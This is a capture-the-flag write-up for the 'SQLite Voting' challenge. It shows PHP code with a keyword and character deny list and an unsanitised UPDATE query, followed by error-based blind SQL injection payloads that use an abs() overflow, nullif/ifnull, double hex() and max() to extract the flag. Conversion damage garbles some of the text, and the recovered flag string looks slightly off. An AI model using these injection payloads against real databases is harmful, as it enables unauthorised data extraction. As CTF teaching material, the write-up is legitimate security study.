<h1>SQLite Voting</h1>

<p>``<code>php
function is_valid($str) {
  $banword = [
    // dangerous chars
    // " % ' * + / &lt; = &gt; \ _</code> ~ -
    "[\"%'*+\/&lt;=&gt;\\<em>`~-]",
    // whitespace chars
    '\s',
    // dangerous functions
    'blob', 'load</em>extension', 'char', 'unicode',
    '(in|sub)str', '[lr]trim', 'like', 'glob', 'match', 'regexp',
    'in', 'limit', 'order', 'union', 'join'
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $str)) {
    return false;
  }
  return true;
}</p>

<p>// request to SQLite db, I skipped is<em>valid($id)
$res = $pdo->query("UPDATE vote SET count = count + 1 WHERE id = ${id}"); 
if ($res === false) {
  die(json</em>encode(['error' =&gt; 'An error occurred while updating database']));
}
```</p>

<p>We can see that we've got a heavily filtered error-based blind sql injection.</p>

<h2>Solution</h2>

<p>First we got the length of the flag by enumerating through <code>$LENGTH$</code> in the following payload:</p>

<p><code>sql
abs(ifnull(nullif(length((SELECT(flag)from(flag))),$LENGTH$),0x8000000000000000))
</code></p>

<p>I will explain the payload bit-by-bit later, but the flag was 38 characters long.</p>

<p>Then, we double hexed the <code>flag</code> so we can be sure that it only produces digits</p>

<p><code>sh
sqlite&gt; select hex('0123456789ABCDEF');
30313233343536373839414243444546
</code></p>

<p>We also know that the length of the produced number is exactly 152-digit long.</p>

<p>You cannot pass integers bigger than <code>9223372036854775807</code> because they will get cast into floating numbers, but you can concatenate them as they were strings, e.g. <code>9223372036854775807||9223372036854775807</code> will produce <code>92233720368547758079223372036854775807</code>. Thanks to this property we now can iterate over all composited 152-digit long <code>$NUMBER$</code> and use the <code>max(A, B)</code> function which will return the bigger one.</p>

<p><code>sql
abs(ifnull(nullif(max(hex(hex((SELECT(flag)from(flag)))),$NUMBER$),$NUMBER$),0x8000000000000000))
</code></p>

<p>We get the double hexed flag which is: 
<code>343836313732363536423631374136353433353434363742333433313644354633373330354636323333354633343546333537313643333133373333354636443334333533373333373237430</code></p>

<p><strong>HarekazeCTF{41m<em>70</em>b3<em>4</em>5ql173_m4573r|</strong></p>

<p><strong>Explaination</strong>:
- <code>abs(-9223372036854775808)</code> will cause integer overflow and hence throw an error
- <code>0x8000000000000000</code> is hex-encoded <code>-9223372036854775808</code>
- <code>nullif(A,B)</code> will return <code>NULL</code> if <code>A</code> equals <code>B</code>, returns <code>A</code> otherwise
- <code>ifnull(A,0x8000000000000000)</code> will return <code>0x8000000000000000</code> if <code>A</code> is <code>NULL</code>, otherwise <code>A</code> is returned.
- <code>max(A,B)</code> returns lexicographically greater string.
- <code>hex(hex(flag)</code> "removes" all non-digit characters from flag</p>
